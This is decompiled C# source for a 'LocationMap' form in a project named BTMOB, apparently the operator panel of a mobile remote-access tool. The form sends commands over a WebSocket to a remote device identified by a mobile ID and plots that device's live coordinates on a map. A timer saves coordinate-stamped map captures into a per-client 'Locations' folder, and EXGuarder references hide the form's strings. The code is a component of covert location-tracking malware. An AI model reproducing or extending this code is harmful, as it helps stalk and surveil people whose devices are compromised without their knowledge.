using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using BTMOB.My.Resources;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Web.WebView2.Core;
using Microsoft.Web.WebView2.WinForms;

namespace BTMOB;

[DesignerGenerated]
public class LocationMap : basestyle
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("comboacctype")]
	private DrakeUIComboBox _comboacctype;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("savitbtn")]
	private DrakeUIButtonIcon _savitbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("savetimer")]
	private System.Windows.Forms.Timer _savetimer;

	public BTClient BTcli;

	private int lastlat;

	private int lastlng;

	[field: AccessedThroughProperty("mapview")]
	internal virtual WebView2 mapview
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel2")]
	internal virtual Panel Panel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIComboBox comboacctype
	{
		[CompilerGenerated]
		get
		{
			return _comboacctype;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = comboacctype_SelectedIndexChanged;
			DrakeUIComboBox drakeUIComboBox = _comboacctype;
			if (drakeUIComboBox != null)
			{
				drakeUIComboBox.SelectedIndexChanged -= value2;
			}
			_comboacctype = value;
			drakeUIComboBox = _comboacctype;
			if (drakeUIComboBox != null)
			{
				drakeUIComboBox.SelectedIndexChanged += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon savitbtn
	{
		[CompilerGenerated]
		get
		{
			return _savitbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = savitbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _savitbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_savitbtn = value;
			drakeUIButtonIcon = _savitbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual System.Windows.Forms.Timer savetimer
	{
		[CompilerGenerated]
		get
		{
			return _savetimer;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = savetimer_Tick;
			System.Windows.Forms.Timer timer = _savetimer;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_savetimer = value;
			timer = _savetimer;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	public LocationMap()
	{
		base.Load += LocationMap_Load;
		base.FormClosing += LocationMap_FormClosing;
		lastlat = 0;
		lastlng = 0;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(BTMOB.LocationMap));
		this.mapview = new Microsoft.Web.WebView2.WinForms.WebView2();
		this.Panel2 = new System.Windows.Forms.Panel();
		this.savitbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.comboacctype = new DrakeUI.Framework.DrakeUIComboBox();
		this.savetimer = new System.Windows.Forms.Timer(this.components);
		((System.ComponentModel.ISupportInitialize)this.myscr).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.myico).BeginInit();
		this.tobpanelsti.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.mapview).BeginInit();
		this.Panel2.SuspendLayout();
		base.SuspendLayout();
		this.pinbtn.Location = new System.Drawing.Point(580, 5);
		this.minibtn.Location = new System.Drawing.Point(622, 5);
		this.closbtn.Location = new System.Drawing.Point(664, 5);
		this.mytitle.Location = new System.Drawing.Point(5, 4);
		this.mytitle.Size = new System.Drawing.Size(696, 18);
		this.tobpanelsti.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.tobpanelsti.Size = new System.Drawing.Size(706, 26);
		this.mapview.AllowExternalDrop = true;
		this.mapview.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.mapview.CreationProperties = null;
		this.mapview.DefaultBackgroundColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.mapview.Dock = System.Windows.Forms.DockStyle.Fill;
		this.mapview.Location = new System.Drawing.Point(2, 107);
		this.mapview.Name = EXGuarder._2658761F;
		this.mapview.Size = new System.Drawing.Size(706, 528);
		this.mapview.TabIndex = 40;
		this.mapview.ZoomFactor = 1.0;
		this.Panel2.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel2.Controls.Add(this.savitbtn);
		this.Panel2.Controls.Add(this.comboacctype);
		this.Panel2.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel2.Location = new System.Drawing.Point(2, 64);
		this.Panel2.Name = EXGuarder._31366D2A;
		this.Panel2.Padding = new System.Windows.Forms.Padding(9, 9, 9, 9);
		this.Panel2.Size = new System.Drawing.Size(706, 43);
		this.Panel2.TabIndex = 41;
		this.savitbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.savitbtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.savitbtn.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.savitbtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.savitbtn.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.savitbtn.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.savitbtn.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.savitbtn.Font = new System.Drawing.Font(EXGuarder._1E6A4245, 9f);
		this.savitbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.savitbtn.ForeHoverColor = System.Drawing.Color.Gray;
		this.savitbtn.Location = new System.Drawing.Point(648, 9);
		this.savitbtn.Name = EXGuarder._573D4D72;
		this.savitbtn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.savitbtn.RectColor = System.Drawing.Color.Gray;
		this.savitbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.savitbtn.RectHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.savitbtn.RectPressColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.savitbtn.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.savitbtn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.savitbtn.Size = new System.Drawing.Size(49, 25);
		this.savitbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.savitbtn.Symbol = 57572;
		this.savitbtn.SymbolSize = 21;
		this.savitbtn.TabIndex = 50;
		this.savitbtn.Tag = EXGuarder._003D5D06;
		this.savitbtn.TagString = EXGuarder._041C2F3A;
		this.comboacctype.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.comboacctype.Dock = System.Windows.Forms.DockStyle.Left;
		this.comboacctype.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
		this.comboacctype.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.comboacctype.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.comboacctype.Font = new System.Drawing.Font(EXGuarder._1E6A4245, 9f);
		this.comboacctype.ForeColor = System.Drawing.Color.White;
		this.comboacctype.Items.AddRange(new object[3]
		{
			EXGuarder._675B3841,
			EXGuarder._04241618,
			EXGuarder._02455076
		});
		this.comboacctype.Location = new System.Drawing.Point(9, 9);
		this.comboacctype.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.comboacctype.MinimumSize = new System.Drawing.Size(56, 0);
		this.comboacctype.Name = EXGuarder._3A03530B;
		this.comboacctype.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
		this.comboacctype.Radius = 15;
		this.comboacctype.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.comboacctype.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.comboacctype.Size = new System.Drawing.Size(189, 25);
		this.comboacctype.Style = DrakeUI.Framework.UIStyle.Custom;
		this.comboacctype.TabIndex = 49;
		this.comboacctype.Text = EXGuarder._675B3841;
		this.comboacctype.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		this.comboacctype.Watermark = EXGuarder._50382902;
		this.savetimer.Interval = 1000;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 18f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(710, 637);
		base.Controls.Add(this.mapview);
		base.Controls.Add(this.Panel2);
		base.Icon = (System.Drawing.Icon)resources.GetObject(EXGuarder._1050210F);
		base.Name = EXGuarder._523B4A64;
		this.Text = EXGuarder._523B4A64;
		base.Controls.SetChildIndex(this.tobpanelsti, 0);
		base.Controls.SetChildIndex(this.Panel2, 0);
		base.Controls.SetChildIndex(this.mapview, 0);
		((System.ComponentModel.ISupportInitialize)this.myscr).EndInit();
		((System.ComponentModel.ISupportInitialize)this.myico).EndInit();
		this.tobpanelsti.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.mapview).EndInit();
		this.Panel2.ResumeLayout(false);
		base.ResumeLayout(false);
	}

	private async void LocationMap_Load(object sender, EventArgs e)
	{
		await mapview.EnsureCoreWebView2Async();
		mapview.NavigateToString(Resources.map);
		Thread thread = new Thread([SpecialName] () =>
		{
			Dictionary<string, object> chatData = new Dictionary<string, object>
			{
				{
					EXGuarder._2943162C,
					EXGuarder._2017525F
				},
				{
					EXGuarder._40653962,
					EXGuarder._024A0A40
				}
			};
			BTEngine.commands(chatData, BTcli.mobid, BTcli.Serverins.WSClient);
		});
		thread.IsBackground = true;
		thread.Start();
		myico.Image = BTcli.wallpaper;
		mytitle.Text = BTConst.loctionstr;
	}

	private void LocationMap_FormClosing(object sender, FormClosingEventArgs e)
	{
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._20052146, EXGuarder._52225A1B);
		dictionary.Add(EXGuarder._67521F26, EXGuarder._18236F38);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, BTcli.mobid, BTcli.Serverins.WSClient);
	}

	public async void UpdateMap(double lat, double lng)
	{
		checked
		{
			lastlat = (int)Math.Round(lat);
			lastlng = (int)Math.Round(lng);
			await mapview.ExecuteScriptAsync($"updateMap({lat}, {lng});");
		}
	}

	public async void Updatetheme(string theme)
	{
		await mapview.ExecuteScriptAsync($"changetheme('{theme}');");
	}

	private void comboacctype_SelectedIndexChanged(object sender, EventArgs e)
	{
		string left = comboacctype.Text;
		if (Operators.CompareString(left, EXGuarder._046C3033, TextCompare: false) != 0)
		{
			if (Operators.CompareString(left, EXGuarder._3A075567, TextCompare: false) == 0)
			{
				Updatetheme(EXGuarder._13111644);
			}
			else
			{
				Updatetheme(EXGuarder._3B2F3042);
			}
		}
		else
		{
			Updatetheme(EXGuarder._4E262C06);
		}
	}

	private void savitbtn_Click(object sender, EventArgs e)
	{
		if (Operators.ConditionalCompareObjectEqual(savitbtn.Tag, EXGuarder._0D6E0E60, TextCompare: false))
		{
			savitbtn.Tag = EXGuarder._0025356D;
			savitbtn.ForeColor = Color.Lime;
			savitbtn.RectColor = Color.Lime;
			savetimer.Start();
			return;
		}
		savitbtn.Tag = EXGuarder._0D6E0E60;
		savitbtn.ForeColor = Color.White;
		savitbtn.RectColor = Color.Gray;
		savetimer.Stop();
		savetimer.Dispose();
		string text = BTcli.userfolder + EXGuarder._73202254;
		if (Directory.Exists(text))
		{
			Process.Start(text);
		}
	}

	private async void savetimer_Tick(object sender, EventArgs e)
	{
		try
		{
			string text = BTcli.userfolder + "\\Locations";
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			using MemoryStream memoryStream = new MemoryStream();
			await mapview.CoreWebView2.CapturePreviewAsync(CoreWebView2CapturePreviewImageFormat.Png, memoryStream);
			string path = text + "\\" + string.Format("map_lt{0}_lg{1}_{2}.png", lastlat, lastlng, DateAndTime.Now.ToString("yyMMddhhmmssfff"));
			using FileStream destination = new FileStream(path, FileMode.Create, FileAccess.Write);
			memoryStream.Position = 0L;
			memoryStream.CopyTo(destination);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
